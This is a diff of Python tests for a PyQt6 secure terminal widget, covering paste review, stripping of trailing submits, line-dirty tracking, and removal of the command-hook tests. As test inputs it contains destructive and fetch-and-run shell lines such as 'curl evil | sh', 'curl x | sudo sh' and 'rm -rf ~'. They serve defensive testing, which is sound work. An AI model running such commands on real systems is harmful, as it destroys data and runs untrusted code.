+# a MULTI-line paste carries a hidden second command that a bare dispatch would
+# auto-run: it is HELD for review whatever the warn setting.
+cw._line_buffer = ''
+cw._line_dirty = False
+_pmml = _QMimePaste()
+_pmml.setText('echo one\ncurl evil | sh\n')
+cw.insertFromMimeData(_pmml)
+ok(cw.review_pending() and not _hsent,
+   'a multi-line paste is held for review before any command can run')
+cw.dispatch_pending_paste('reject')
+eq(_hsent, [], 'rejecting the held multi-line paste sends nothing')
+# even on a clean line a paste never submits: the pasted text sits at the prompt and the
+# line is marked unverifiable. _line_buffer is untouched, _line_dirty is set.
+cw._line_buffer = 'echo '                            # already typed at the prompt
+cw._line_dirty = False
+_pmsub = _QMimePaste()
+_pmsub.setText('ok\n')
+cw.insertFromMimeData(_pmsub)
+ok(not cw.review_pending(), 'a single-line paste on a clean line is not held')
+eq(_hsent, [b'ok'], 'the paste lands at the prompt with no trailing submit')
+ok(cw._line_dirty and cw._line_buffer == 'echo ',
+   'the pasted text is unverifiable, buffer intact')
+_hsent.clear()
+# a TUI-mode paste does not touch the line-mode command, so never sets the flag.
+_tuipaste = SecureTerminal(command='/bin/cat', tui=True)
+_tuipaste._line_dirty = False
+_pmt = _QMimePaste()
+_pmt.setText('ls')
+_tuipaste.insertFromMimeData(_pmt)
+ok(not _tuipaste._line_dirty, 'a TUI-mode paste does not set the line-dirty flag')
+# TUI handler: Ctrl+U must PRESERVE an already-dirty flag (its reach is cursor-dependent),
+# so _line_pending() keeps deferring a re-export. Ctrl+C (SIGINT) still settles the line.
+_tuictrl = Qt.KeyboardModifier.ControlModifier
+_tuipaste.has_foreground_program = lambda: False
+_tuipaste._line_dirty = True
+key(_tuipaste, Qt.Key.Key_U, mods=_tuictrl)             # Ctrl+U at a non-end cursor
+ok(_tuipaste._line_dirty, 'TUI Ctrl+U after a cursor move STAYS dirty')
+_tuipaste._line_dirty = True
+key(_tuipaste, Qt.Key.Key_C, mods=_tuictrl)             # Ctrl+C discards the whole line
+ok(not _tuipaste._line_dirty, 'TUI Ctrl+C (SIGINT) settles the line -- flag cleared')
+
+# a CLI paste leaves the pasted command un-mirrored at the prompt, so _line_pending()
+# must report a held prompt -- otherwise a later mode switch / line_edits toggle types the
+# CR-terminated re-export onto the paste and auto-submits it.
+_nh = SecureTerminal(command='/bin/cat')
+ok(not _nh.tui_active(), 'the widget is a CLI terminal')
+ok(not _nh._line_pending(), 'a fresh clean prompt is not pending')
+_nh._line_dirty = False
+_pmnh = _QMimePaste()
+_pmnh.setText('curl evil | sh\n')
+_nh.insertFromMimeData(_pmnh)
+ok(_nh._line_dirty,
+   'a CLI paste marks the line unverifiable (guards _send_reexport)')
+ok(_nh._line_pending(),
+   '_line_pending() reports a held prompt after a paste, blocking re-export')
+
+# Ctrl+M / Ctrl+J are accept-line (submit) like Enter: they reset the line state so a
+# stale dirty flag does not poison the next prompt.
+cw._line_buffer = 'curl x | sudo sh'
+cw._line_dirty = True
+_hsent.clear()
+key(cw, Qt.Key.Key_M, mods=_ctrl_mod)                # Ctrl+M == CR == accept-line
+ok(not cw._line_dirty and cw._line_buffer == '' and b'\r' in _hsent,
+   'Ctrl+M submits and resets the line state')
+cw._line_buffer = 'ls'
+cw._line_dirty = False
+_hsent.clear()
+key(cw, Qt.Key.Key_J, mods=_ctrl_mod)                # Ctrl+J == LF == accept-line
+ok(not cw._line_dirty and cw._line_buffer == '' and b'\n' in _hsent,
+   'Ctrl+J submits, resets the line, leaves no stale dirty flag')
+
+# paste_warn='never' must NOT bypass the multi-command gate: a MULTI-line paste (a hidden
+# second command that would auto-run) is still held for review. A single-line paste is
+# delivered with its submit stripped, so it cannot auto-run either.
+_hsent.clear()
+cw.apply_paste_warn('never')
+cw._line_dirty = False
+_pmnever = _QMimePaste()
+_pmnever.setText('echo a\nrm -rf ~\n')                # embedded newline -> multi-command
+cw.insertFromMimeData(_pmnever)
+ok(cw.review_pending(),
+   "paste_warn='never' still holds a MULTI-line paste (hidden second command)")
+cw.dispatch_pending_paste('reject')
+eq(_hsent, [], 'the rejected multi-line paste sends nothing to the shell')
+# a single-line paste under 'never' is NOT held -- delivered without its submit.
+cw._line_dirty = False
+_pmnever1 = _QMimePaste()
+_pmnever1.setText('rm -rf ~\n')
+cw.insertFromMimeData(_pmnever1)
+ok(not cw.review_pending(), "paste_warn='never': a single-line paste is not held")
+eq(_hsent, [b'rm -rf ~'],
+   "even under 'never' a single-line paste reaches the shell WITHOUT its submit")
+_hsent.clear()
+cw.apply_paste_warn('unicode')
+
 
 # OSC-52 reply truncation: a slow/gone child can leave the ~87 KiB reply truncated, its
 # buffered prefix then lacking the OSC terminator -- a dangling escape that swallows the
@@ -3023,181 +2882,15 @@ try:
 finally:
     signal.signal(signal.SIGCHLD, _f5_prev_chld)
 
-# --- command-hook desync fail-safe (widened): Tab completion and readline control
-# edits rewrite the shell's line without updating _line_buffer, so the hook must
-# mark the line unverifiable (ask on Enter) rather than judge a stale buffer.
-_ctrl_mod = Qt.KeyboardModifier.ControlModifier
-hk._line_buffer = 'dd of=/dev/sd'
-hk._line_dirty = False
-key(hk, Qt.Key.Key_Tab, '\t')
-ok(hk._line_dirty, 'Tab completion marks the line unverifiable for the hook')
-hk._line_dirty = False
-key(hk, Qt.Key.Key_A, mods=_ctrl_mod)                # Ctrl+A: move-to-start (readline)
-ok(hk._line_dirty, 'a readline control edit (Ctrl+A) marks the line unverifiable')
-hk._line_dirty = False
-key(hk, Qt.Key.Key_BracketRight, '\x1d', mods=_ctrl_mod)   # generic control edit
-ok(hk._line_dirty, 'a generic control edit marks the line unverifiable')
-hk._line_dirty = False
-hk._line_buffer = 'x'
-key(hk, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U: full-line discard
-ok(not hk._line_dirty and hk._line_buffer == '',
-   'Ctrl+U discards the line and stays clean (nothing stale to ask about)')
-# Ctrl+U's reach is cursor-dependent (bash unix-line-discard kills only cursor-to-
-# start), so it must NOT clear an ALREADY-dirty flag: Home (dirty) then Ctrl+U can
-# leave a survivor in the shell, but the old code reset the flag -> Enter submitted
-# it UNJUDGED. Fail-on-old canary for the command_hook bypass (reviewdrain15).
-_asked2 = []
-hk._hook_ask = lambda _c, _r: (_asked2.append(1) or 'discard')
-hk._line_buffer = 'rm -rf ~/important'
-hk._line_dirty = True                                # cursor moved (e.g. Home/Ctrl+A)
-key(hk, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U at a non-end cursor
-ok(hk._line_dirty,
-   'Ctrl+U after a cursor move STAYS dirty -- a survivor must still fail safe')
-key(hk, Qt.Key.Key_Return)
-ok(_asked2, 'Enter after dirty+Ctrl+U ASKS, never submits the unjudged survivor')
-hk._line_dirty = False
-
-# --- paste + hook: a paste can NEVER auto-execute. A SINGLE-line paste (with or
-# without a trailing newline) is delivered with its trailing submit stripped, so
-# it lands at the prompt un-entered -- and since _line_buffer never saw those
-# bytes, the line is marked unverifiable so the hook FAILS SAFE (asks) on the next
-# Enter. A MULTI-line paste (a hidden second command) is HELD for review first.
-from PyQt6.QtCore import QMimeData as _QMimeHook          # noqa: E402
-hk.apply_paste_warn('unicode')       # (reuse the _hsent spy set up above)
-_hsent.clear()
-hk._line_dirty = False
-_pmnl = _QMimeHook()
-_pmnl.setText('rm -rf /tmp/x\n')                     # single-line + trailing newline
-hk.insertFromMimeData(_pmnl)
-ok(not hk.review_pending(),
-   'a single-line paste is not held (it cannot auto-run once the submit is stripped)')
-eq(_hsent, [b'rm -rf /tmp/x'],
-   'a single-line paste reaches the shell WITHOUT its trailing submit -- no auto-run')
-ok(hk._line_dirty,
-   'a paste marks the line unverifiable so the hook asks on the user\'s next Enter')
-_hsent.clear()
-hk._line_dirty = False
-_pmins = _QMimeHook()
-_pmins.setText('ls -la')                             # no newline: inserts into the line
-hk.insertFromMimeData(_pmins)
-ok(hk._line_dirty,
-   'a non-submitting paste marks the line dirty so the hook asks on the next Enter')
-_hsent.clear()
-# a MULTI-line paste carries a hidden second command that a bare dispatch would
-# auto-run: it is HELD for review whatever the warn setting, even with a hook.
-hk._line_buffer = ''
-hk._line_dirty = False
-_pmml = _QMimeHook()
-_pmml.setText('echo one\ncurl evil | sh\n')
-hk.insertFromMimeData(_pmml)
-ok(hk.review_pending() and not _hsent,
-   'a multi-line paste is held for review before any command can run')
-hk.dispatch_pending_paste('reject')
-eq(_hsent, [], 'rejecting the held multi-line paste sends nothing')
-# even on a clean line a paste never submits, so the pasted text sits at the
-# prompt and the line is marked unverifiable (the hook re-judges on the Enter the
-# user must press): _line_buffer is untouched, _line_dirty is set.
-hk._line_buffer = 'echo '                            # already typed at the prompt
-hk._line_dirty = False
-_pmsub = _QMimeHook()
-_pmsub.setText('ok\n')
-hk.insertFromMimeData(_pmsub)
-ok(not hk.review_pending(), 'a single-line paste on a clean line is not held')
-eq(_hsent, [b'ok'], 'the paste lands at the prompt with no trailing submit')
-ok(hk._line_dirty and hk._line_buffer == 'echo ',
-   'the pasted text is unverifiable -> the hook asks on the next Enter, buffer intact')
-_hsent.clear()
-# a TUI-mode paste does not touch the line-mode command, so never sets the flag.
-_tuihk = SecureTerminal(command='/bin/cat', tui=True)
-_tuihk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
-                   'transcript': 'none'})
-_tuihk._line_dirty = False
-_pmt = _QMimeHook()
-_pmt.setText('ls')
-_tuihk.insertFromMimeData(_pmt)
-ok(not _tuihk._line_dirty, 'a TUI-mode paste does not set the line-dirty flag')
-# TUI handler: Ctrl+U must PRESERVE an already-dirty flag too (its reach is cursor-
-# dependent), or a bare-prompt accept-line in TUI submits an unjudged survivor -- the
-# same command_hook bypass as the CLI path. Ctrl+C (SIGINT) still settles the line.
-_tuictrl = Qt.KeyboardModifier.ControlModifier
-_tuihk.has_foreground_program = lambda: False
-_tuihk._line_dirty = True
-key(_tuihk, Qt.Key.Key_U, mods=_tuictrl)             # Ctrl+U at a non-end cursor
-ok(_tuihk._line_dirty, 'TUI Ctrl+U after a cursor move STAYS dirty (no hook bypass)')
-_tuihk._line_dirty = True
-key(_tuihk, Qt.Key.Key_C, mods=_tuictrl)             # Ctrl+C discards the whole line
-ok(not _tuihk._line_dirty, 'TUI Ctrl+C (SIGINT) settles the line -- flag cleared')
-
-# --- paste WITHOUT a hook: _line_dirty has a SECOND consumer beyond the hook --
-# _line_pending(), the guard that stops _send_reexport from typing "export
-# TERM=...\r" onto a line that already holds text. A hookless CLI paste leaves the
-# pasted command un-mirrored at the prompt, so the line MUST read unverifiable even
-# with no hook -- otherwise a later mode switch / line_edits toggle types the
-# CR-terminated re-export onto the paste and auto-submits it. (Gating _line_dirty
-# on the hook made this fail; regression guard.)
-_nh = SecureTerminal(command='/bin/cat')             # no apply_hook -> _hook is None
-ok(_nh._hook is None and not _nh.tui_active(),
-   'the no-hook widget is a hookless CLI terminal')
-ok(not _nh._line_pending(), 'a fresh clean prompt is not pending')
-_nh._line_dirty = False
-_pmnh = _QMimeHook()
-_pmnh.setText('curl evil | sh\n')
-_nh.insertFromMimeData(_pmnh)
-ok(_nh._line_dirty,
-   'a hookless CLI paste marks the line unverifiable (guards _send_reexport)')
-ok(_nh._line_pending(),
-   '_line_pending() reports a held prompt after a hookless paste, blocking re-export')
-
-# --- Ctrl+M / Ctrl+J are accept-line (submit) like Enter: they must route through
-# the hook and reset the line state, not run unjudged and leave a stale dirty flag.
-hk._hook_ask = lambda _c, _r: 'discard'              # block dialog -> discard
-hk._line_buffer = 'curl x | sudo sh'
-hk._line_dirty = False                               # clean line -> hook evaluates it
-_hsent.clear()
-key(hk, Qt.Key.Key_M, mods=_ctrl_mod)                # Ctrl+M == CR == accept-line
-ok(b'\r' not in _hsent,
-   'Ctrl+M routes a blocked command through the hook (not submitted)')
-hk._line_buffer = 'ls'
-hk._line_dirty = False                               # clean allowed line
-_hsent.clear()
-key(hk, Qt.Key.Key_J, mods=_ctrl_mod)                # Ctrl+J == LF == accept-line
-ok(not hk._line_dirty and hk._line_buffer == '' and b'\n' in _hsent,
-   'Ctrl+J (allowed) submits, resets the line, leaves no stale dirty flag')
-
-# paste_warn='never' must NOT bypass the multi-command gate: a MULTI-line paste
-# (a hidden second command that would auto-run) is still held for review whatever
-# the warn setting. A single-line paste is instead delivered with its submit
-# stripped, so it cannot auto-run either -- it never needs the hold.
-_hsent.clear()
-hk.apply_paste_warn('never')
-hk._line_dirty = False
-_pmnever = _QMimeHook()
-_pmnever.setText('echo a\nrm -rf ~\n')                # embedded newline -> multi-command
-hk.insertFromMimeData(_pmnever)
-ok(hk.review_pending(),
-   "paste_warn='never' still holds a MULTI-line paste (hidden second command)")
-hk.dispatch_pending_paste('reject')
-eq(_hsent, [], 'the rejected multi-line paste sends nothing to the shell')
-# a single-line paste under 'never' is NOT held -- delivered without its submit.
-hk._line_dirty = False
-_pmnever1 = _QMimeHook()
-_pmnever1.setText('rm -rf ~\n')
-hk.insertFromMimeData(_pmnever1)
-ok(not hk.review_pending(), "paste_warn='never': a single-line paste is not held")
-eq(_hsent, [b'rm -rf ~'],
-   "even under 'never' a single-line paste reaches the shell WITHOUT its submit")
-_hsent.clear()
-hk.apply_paste_warn('unicode')
-
 # a second paste arriving while a review is already open is ignored, not allowed to
 # clobber the pending one (input is otherwise suspended during a review).
 _rev = SecureTerminal(command='/bin/cat')
 _rev.apply_paste_warn('always')
-_pmrev1 = _QMimeHook()
+_pmrev1 = _QMimePaste()
 _pmrev1.setText('first-paste')
 _rev.insertFromMimeData(_pmrev1)
 ok(_rev.review_pending(), 'first paste opens a review')
-_pmrev2 = _QMimeHook()
+_pmrev2 = _QMimePaste()
 _pmrev2.setText('second-paste')
 _rev.insertFromMimeData(_pmrev2)                     # arrives during the open review
 ok(_rev.review_pending() and _rev._pending_paste == 'first-paste',
@@ -4737,12 +4430,12 @@ try:
     _sr = rcwin._dispatch_request(
         b'{"op":"ctl-send-text","tab":"title:main","text":"ok\\n"}')
     # Delivered as a PASTE: sanitized, then the TRAILING submit is stripped, so a
-    # `send-text $'cmd\n'` injection cannot auto-run cmd at the prompt with no hook
-    # verdict; the line is marked unverifiable so the hook fails safe on Enter.
+    # `send-text $'cmd\n'` injection cannot auto-run cmd at the prompt; it waits
+    # there for the user's own Enter. The line is marked unverifiable.
     ok(_sr.get('ok') and _t == [b'ok'],
-       'ctl: send-text sanitizes but never auto-submits (no trailing CR, no hook bypass)')
+       'ctl: send-text sanitizes but never auto-submits (no trailing CR)')
     ok(rcwin.current()._line_dirty,
-       'ctl: send-text marks the line unverifiable (command hook fails safe)')
+       'ctl: send-text marks the line unverifiable')
     # a control character in send-text is dropped by the sanitizer
     _t2 = spy_writes(rcwin.current())
     rcwin._dispatch_request(
@@ -5506,16 +5199,14 @@ ok(not any(b'export TERM=' in s for s in _tgcsent),
    'a command tab (command != None) never re-exports TERM into the program')
 _tgc.close()
 
-# --- a pending line DEFERS the re-export (pty injection / hook bypass) ---------
+# --- a pending line DEFERS the re-export (pty injection) -----------------------
 # `export TERM=...` is TYPED INPUT terminated by CR, so sending it while the user
 # has a half-typed line makes the shell receive `<pending>export TERM=...` and RUN
-# it -- an Enter nobody pressed, submitting their unfinished text. And because that
-# submission is generated by the mode switch rather than by the Enter handler, it
-# never passes command_hook: the terminal would route its own security control
-# around. Verified against a real bash on a real pty: a pending `echo mark$((6*7))`
-# came back as `mark42 export TERM=xterm-256color`, with the hook never consulted.
-# So: hold the re-export until the prompt is clear -- and never kill the line to
-# make room, because discarding what someone typed is not ours to do.
+# it -- an Enter nobody pressed, submitting their unfinished text. Verified against
+# a real bash on a real pty: a pending `echo mark$((6*7))` came back as
+# `mark42 export TERM=xterm-256color`. So: hold the re-export until the prompt is
+# clear -- and never kill the line to make room, because discarding what someone
+# typed is not ours to do.
 _tgp = SecureTerminal(command=None)
 _tgpadv = []
 _tgp.advise_signal.connect(_tgpadv.append)
@@ -5527,7 +5218,7 @@ ok(_tgp.apply_tui(True) is True and _tgp._tui is True,
 ok(_tgpsent == [],
    'a pending line defers the re-export: nothing is typed into the shell')
 ok(not any(b'\r' in s for s in _tgpsent),
-   'no accept-line reaches the shell, so nothing bypasses the command hook')
+   'no accept-line reaches the shell, so the pending line is never force-submitted')
 eq(_tgp._line_buffer, 'rm -rf ~/important',
    'the half-typed line is left intact (never killed to make room)')
 ok(any('submitted or cleared' in a for a in _tgpadv),
@@ -5549,14 +5240,14 @@ _tgp.close()
 # The same hazard with an INVISIBLE line: a history recall (Up) rewrites the real
 # shell line without going through _line_buffer, so the buffer reads empty while
 # the prompt is actually full. _line_dirty is what records "we cannot see this
-# line", and it is set whether or not a command hook is configured -- a line we
-# cannot see is exactly the line a CR-terminated re-export must not be typed into.
+# line" -- a line we cannot see is exactly the line a CR-terminated re-export must
+# not be typed into.
 _tgd = SecureTerminal(command=None)
 _tgdsent = spy_writes(_tgd)
 _tgd.has_foreground_program = lambda: False
 key(_tgd, Qt.Key.Key_Up)                               # recall a previous command
 ok(_tgd._line_dirty and _tgd._line_buffer == '',
-   'history recall marks the line unmirrored even with no hook configured')
+   'history recall marks the line unmirrored')
 _tgdsent.clear()                                       # drop the arrow sequence
 _tgd.apply_tui(True)
 ok(_tgdsent == [],
@@ -5567,9 +5258,8 @@ _tgd.close()
 # text typed at a BARE prompt (no foreground program) touches neither _line_buffer
 # nor -- until now -- _line_dirty. Left unflagged, a TUI->CLI switch fired an
 # immediate CR-terminated re-export that concatenated onto and SUBMITTED that
-# typed line: an Enter nobody pressed, routed around command_hook. So a TUI
-# keystroke at a bare prompt marks the line dirty, and the switch defers exactly
-# like a mirrored CLI line.
+# typed line: an Enter nobody pressed. So a TUI keystroke at a bare prompt marks
+# the line dirty, and the switch defers exactly like a mirrored CLI line.
 _tt = SecureTerminal(command=None, tui=True)
 _ttsent = spy_writes(_tt)
 _tt.has_foreground_program = lambda: False              # bare shell prompt
@@ -5584,7 +5274,7 @@ _tt.apply_tui(False)                                    # flip TUI -> CLI
 ok(_ttsent == [],
    'the TUI-typed line defers the re-export: nothing is typed into the shell')
 ok(not any(b'\r' in s for s in _ttsent),
-   'no CR is generated, so the typed line is never force-submitted past the hook')
+   'no CR is generated, so the typed line is never force-submitted')
 # It must still LAND once the prompt clears, or the switch is merely broken. The
 # tab is in CLI mode now; submitting the line releases the deferral.
 key(_tt, Qt.Key.Key_Return)                             # user submits -> prompt clears
@@ -5622,47 +5312,35 @@ ok(any(b'export TERM=secure-terminal\r' == s for s in _tpsent),
    'once the program exits, the switch re-exports immediately (nothing stranded)')
 _tp.close()
 
-# A bare shell prompt in TUI mode must NOT be a silent bypass of the command hook:
-# switching to TUI, typing a command, and pressing Enter has to be judged too. TUI
-# does not mirror the line, so the hook sees _line_dirty and falls through to a human
-# review (fail-safe), never an unjudged submit.
+# A bare shell prompt in TUI mode still submits real commands: switching to TUI,
+# typing a command, and pressing Enter has to submit and settle the line. An empty
+# prompt submits with nothing to reset; a program owning the terminal receives the
+# accept-line directly.
 _thk = SecureTerminal(command=None, tui=True)
-_thk.apply_hook({'argv': ['/bin/true'], 'timeout': 10, 'on_error': 'allow',
-                 'transcript': 'none'})
 _thksent = spy_writes(_thk)
 _thk.has_foreground_program = lambda: False
-_tui_asked = []
-_thk._hook_ask = lambda _c, _r: (_tui_asked.append(1) or 'discard')
-key(_thk, Qt.Key.Key_L, 'l')                            # type `ls` at the TUI prompt
-key(_thk, Qt.Key.Key_S, 's')
-key(_thk, Qt.Key.Key_Return)                            # accept-line
-ok(_tui_asked and b'\r' not in _thksent and b'\x03' in _thksent,
-   'a bare TUI prompt routes accept-line through the hook (no silent bypass)')
-# an EMPTY bare prompt has nothing to judge -> the hook passes, Enter submits, no ask
-_thksent.clear(); _tui_asked.clear()
 _thk._line_dirty = False
 _thk._line_buffer = ''
 key(_thk, Qt.Key.Key_Return)
-ok(not _tui_asked and b'\r' in _thksent,
-   'an empty TUI prompt submits normally (the hook has nothing to judge)')
-# while a foreground program owns the terminal, accept-line goes to IT, not the hook
-_thksent.clear(); _tui_asked.clear()
+ok(b'\r' in _thksent,
+   'an empty TUI prompt submits normally on accept-line')
+# while a foreground program owns the terminal, accept-line goes to IT
+_thksent.clear()
 _thk.has_foreground_program = lambda: True
 key(_thk, Qt.Key.Key_Return)
-ok(not _tui_asked and b'\r' in _thksent,
-   'a program owning the terminal receives accept-line directly (hook not consulted)')
+ok(b'\r' in _thksent,
+   'a program owning the terminal receives accept-line directly')
 _thk.close()
 
 # A paste at a bare TUI shell prompt is a command the next Enter submits, so it must
-# mark the line unverifiable too -- else it reaches the shell and Enter submits it
-# past the hook (the same bypass, via paste instead of typing).
+# mark the line unverifiable too, keeping _line_pending() aware the prompt is held.
 _tpp = SecureTerminal(command=None, tui=True)
 spy_writes(_tpp)
 _tpp.has_foreground_program = lambda: False
 _tpp._line_dirty = False
 _tpp._dispatch_paste('rm -rf ~', 'unicode')             # paste at a bare TUI prompt
 ok(_tpp._line_dirty,
-   'a paste at a bare TUI prompt marks the line unverifiable (Enter routes to the hook)')
+   'a paste at a bare TUI prompt marks the line unverifiable')
 _tpp.has_foreground_program = lambda: True               # a program owns the terminal
 _tpp._line_dirty = False
 _tpp._dispatch_paste('data', 'unicode')                  # paste is the program's data
@@ -5672,8 +5350,8 @@ _tpp.close()
 
 # A CLI-typed line carried into TUI stays in _line_buffer; editing it there with a
 # key TUI cannot mirror (Backspace/Home/Delete) desyncs the buffer from the real
-# shell line, so it must invalidate the buffer -- else the hook judges the stale
-# (safe) buffer while the shell runs the edited (dangerous) command.
+# shell line, so it must invalidate the buffer -- keeping _line_pending() honest so
+# a CR-terminated re-export is not typed onto the edited line.
 _tce = SecureTerminal(command=None, tui=True)
 spy_writes(_tce)
 _tce.has_foreground_program = lambda: False
@@ -5681,7 +5359,7 @@ _tce._line_buffer = '#rm -rf ~'                          # carried CLI line, com
 _tce._line_dirty = False
 key(_tce, Qt.Key.Key_Backspace)                          # edit it in TUI (delete the #)
 ok(_tce._line_dirty,
-   'a TUI edit of a carried CLI line invalidates the stale buffer (hook fails safe)')
+   'a TUI edit of a carried CLI line invalidates the stale buffer')
 _tce.close()
 
 # A no-op key at an EMPTY bare TUI prompt introduces no content, so it must NOT
@@ -6715,22 +6393,6 @@ try:
 finally:
     _term.BELL_SOUND_DIRS = _orig_dirs
 
-# --- hook transcript providers ------------------------------------------------
-_htx = SecureTerminal(command='/bin/cat')
-_htx._append('line one\nline two\nline three')
-_htx._hook = {'transcript': 'full'}
-ok('line one' in _htx._hook_transcript() and 'three' in _htx._hook_transcript(),
-   '_hook_transcript full: returns the whole buffer')
-_htx._hook = {'transcript': 'tail:2'}
-_tail = _htx._hook_transcript()
-ok('three' in _tail and 'one' not in _tail,
-   '_hook_transcript tail:N: returns only the last N lines')
-_htx._hook = {'transcript': 'tail:notanumber'}
-eq(_htx._hook_transcript(), '',
-   '_hook_transcript tail: a non-numeric count yields nothing')
-_htx._hook = {'transcript': 'none'}
-eq(_htx._hook_transcript(), '', '_hook_transcript none: returns nothing')
-
 # --- TUI keystroke encoding (_tui_key) ----------------------------------------
 _tk = SecureTerminal(command='/bin/cat')
 _tksent = spy_writes(_tk)
@@ -6783,49 +6445,6 @@ ok(not _fg.has_foreground_program(),
    'has_foreground_program: no foreground group -> False')
 ok(not _fg.terminate_foreground(),
    'terminate_foreground: nothing running -> no signal sent')
-
-# --- the real _hook_ask prompt (QMessageBox driven headlessly) ----------------
-from PyQt6.QtWidgets import QMessageBox as _QMB          # noqa: E402
-_ha = SecureTerminal(command='/bin/cat')
-# a block with no suggestion needs no prompt -> discard immediately
-eq(_ha._hook_ask('rm -rf /', {'verdict': 'block', 'suggestion': '', 'message': ''}),
-   'discard', '_hook_ask: a block with no suggestion discards without a prompt')
-# drive the dialog by faking which button the user clicked, per role
-_orig_mb_exec = _QMB.exec
-_orig_mb_clicked = _QMB.clickedButton
-_pick = {'role': None}
-_ha_boxes = []
-
-
-def _fake_mb_exec(self):
-    _ha_boxes.append(self)
-    return 0
-
-
-def _fake_mb_clicked(self):
-    for _b in self.buttons():
-        if _pick['role'] is not None and self.buttonRole(_b) == _pick['role']:
-            return _b
-    return None
-
-
-_QMB.exec = _fake_mb_exec
-_QMB.clickedButton = _fake_mb_clicked
-try:
-    _res = {'verdict': 'ask', 'suggestion': 'ls -la', 'message': 'looks risky'}
-    _pick['role'] = _QMB.ButtonRole.AcceptRole
-    eq(_ha._hook_ask('ls', _res), 'run', '_hook_ask: "Run as typed" -> run')
-    _pick['role'] = _QMB.ButtonRole.ActionRole
-    eq(_ha._hook_ask('ls', _res), 'suggest', '_hook_ask: "Use suggestion" -> suggest')
-    _pick['role'] = _QMB.ButtonRole.RejectRole
-    eq(_ha._hook_ask('ls', _res), 'discard', '_hook_ask: Cancel -> discard')
-    # #10: the advisory text is pinned PlainText so an untrusted command / hook message
-    # cannot render as rich text (markup that would hide or restyle the reviewed command).
-    ok(_ha_boxes and all(b.textFormat() == Qt.TextFormat.PlainText for b in _ha_boxes),
-       '_hook_ask: the advisory dialog forces PlainText (no rich-text rendering)')
-finally:
-    _QMB.exec = _orig_mb_exec
-    _QMB.clickedButton = _orig_mb_clicked
 
 # --- Ctrl+wheel zoom ----------------------------------------------------------
 from PyQt6.QtGui import QWheelEvent          # noqa: E402
@@ -6998,40 +6617,6 @@ ok(True, '_ring: a second ring within ~200ms is rate-limited')
 eq(_rg.current_paste_delay(), _rg._paste_delay,
    'current_paste_delay: returns the configured paste delay')
 
-# --- hook intercept: the run / suggest / empty-line branches ------------------
-hk2 = SecureTerminal(command='/bin/cat')
-hk2.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
-                'transcript': 'none'})
-_h2 = spy_writes(hk2)
-hk2.has_foreground_program = lambda: False        # judge only at a bare prompt
-# an empty line is not intercepted -> normal submit
-hk2._line_buffer = ''
-hk2._line_dirty = False
-key(hk2, Qt.Key.Key_Return)
-ok(b'\r' in _h2, 'hook: an empty line submits without interception')
-# a recalled/edited line with the user choosing Run -> submitted
-_h2.clear()
-hk2._hook_ask = lambda _c, _r: 'run'
-key(hk2, Qt.Key.Key_Up)                     # marks the line dirty
-key(hk2, Qt.Key.Key_Return)
-ok(b'\r' in _h2, 'hook: an edited line the user runs is submitted')
-# a blocked command the user chooses to Run -> submitted
-_h2.clear()
-hk2._hook_ask = lambda _c, _r: 'run'
-_htype(hk2, 'x sudo sh')
-key(hk2, Qt.Key.Key_Return)
-ok(b'\r' in _h2, 'hook: a flagged command the user runs is submitted')
-# a blocked command the user replaces with the suggestion -> suggestion inserted
-_h2.clear()
-hk2._hook_ask = lambda _c, _r: 'suggest'
-_htype(hk2, 'x sudo sh')
-key(hk2, Qt.Key.Key_Return)
-# The mirrored line is counted-erased then the suggestion is written -- NO SIGINT,
-# whose tcflush would swallow the suggestion bytes written immediately after it.
-ok(b'ls' in b''.join(_h2) and (b'\x7f' * len('x sudo sh')) in _h2
-   and b'\x03' not in _h2,
-   'hook: the suggestion erases the line char-for-char and inserts itself (no flush)')
-
 # --- paste: an all-control paste sanitizes to nothing; bracketed paste in TUI --
 _pt = SecureTerminal(command='/bin/cat')
 _pt.apply_paste_warn('never')               # test the sanitize+bracket path directly
@@ -7142,7 +6727,6 @@ def _raise_os(*_a, **_k):
 
 try:
     _os.readlink = _raise_os
-    eq(_cw._foreground_cwd(), '', '_foreground_cwd: a /proc read error -> empty')
     ok(_cw.cwd_basename() is None, 'cwd_basename: a /proc read error -> None')
     _os.getpgid = lambda *_a, **_k: (_ for _ in ()).throw(ProcessLookupError())
     ok(not _cw.has_foreground_program(),
@@ -7302,10 +6886,6 @@ key(_tkm, Qt.Key.Key_Up, mods=Qt.KeyboardModifier.ControlModifier)
 key(_tkm, Qt.Key.Key_End)
 eq(_tkms, [b'\x1b[1;5F', b'\x1b[1;2F', b'\x1b[1;5A', b'\x1b[F'],
    'TUI: a modified cursor/End key is CSI-encoded (Ctrl+End=ESC[1;5F); bare End=ESC[F')
-
-# hook_enabled reflects whether a hook is configured
-_he = SecureTerminal(command='/bin/cat')
-ok(_he.hook_enabled() is False, 'hook_enabled: no hook -> False')
 
 # a tooltip over empty space (no codepoint) hides any tip
 _tt = SecureTerminal(command='/bin/cat')
@@ -7855,16 +7435,17 @@ ok(_bp_frame.startswith(b'\x1b[200~') and _bp_frame.endswith(b'\x1b[201~'),
 # A line of many non-ASCII cells renders each as a long Detail badge, far wider than
 # the viewport. A real terminal has no horizontal scroll: the display WRAPS to the
 # width (WidgetWidth) so every badge stays on screen -- nothing pushed off the right
-# edge, and no auto-scroll that would clip the START of each row. The horizontal
+# edge, and no auto-scroll that would clip the START of each row. In CLI the horizontal
 # scrollbar policy stays as-needed only for the residual Box/Show wide-glyph overflow
-# (left NoWrap for cross-mode stability, and home-pinned by _paint_line); it must NOT
-# appear for a wrapped Detail line.
-ok(_bp_no.horizontalScrollBarPolicy() == Qt.ScrollBarPolicy.ScrollBarAsNeeded,
-   'reconcile#3: the horizontal scrollbar policy is as-needed')
-_hs = SecureTerminal(command='/bin/cat')                   # default Detail mode
+# (left NoWrap for cross-mode stability, and home-pinned by _paint_line); a grid/TUI tab
+# suppresses it entirely (AlwaysOff -- see the scrollbar-policy block near the top). It
+# must NOT appear for a wrapped Detail line either way.
+_hs = SecureTerminal(command='/bin/cat')                   # default Detail mode (CLI)
 _hs.resize(220, 120)
 _hs.show()
 APP.processEvents()
+ok(_hs.horizontalScrollBarPolicy() == Qt.ScrollBarPolicy.ScrollBarAsNeeded,
+   'reconcile#3: CLI keeps the horizontal scrollbar policy as-needed')
 feed_output(_hs, ('\u00e9' * 40).encode('utf-8'))     # 40 long badges -> wide line
 APP.processEvents()
